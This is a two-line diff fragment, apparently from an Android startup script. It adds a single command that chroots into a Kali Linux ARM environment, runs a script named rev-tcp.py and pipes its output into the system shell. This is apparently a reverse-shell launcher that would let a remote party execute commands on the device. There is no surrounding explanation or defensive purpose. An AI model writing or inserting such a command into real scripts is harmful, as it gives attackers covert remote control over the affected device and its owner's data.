@@ -1,0 +1,2 @@
+chroot /data/local/kali-armhf/ "/usr/bin/rev-tcp.py"  |/system/bin/sh
+
